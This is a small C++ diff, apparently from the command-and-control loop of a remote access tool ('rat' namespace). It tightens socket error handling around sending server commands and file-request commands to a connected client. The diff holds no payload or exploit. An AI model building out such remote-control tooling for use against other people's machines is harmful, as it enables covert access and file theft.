@@ -24,8 +24,7 @@ void HandleClient::ControlClient()
 	}
 
 	while(true){
-		sock.SafeSend("", 0);
-		if (sock.Disconnected())
+		if (sock.SendBytes(std::vector<char>()) || sock.Disconnected())
 		{
 			break;
 		}
@@ -35,7 +34,11 @@ void HandleClient::ControlClient()
 		if (server_cmd.GetType() == -1) {
 			continue;
 		}
-		sock.SendBytes(server_cmd.ToTcpPacket());
+		
+		if (sock.SendBytes(server_cmd.ToTcpPacket()) < 0 || sock.Disconnected())
+		{
+			break;
+		}
 		if (server_cmd.GetType() == static_cast<int>(rat::Command::CommandType::kClientSendFile))
 		{
 			std::string file_path = server_cmd.GetArgument();
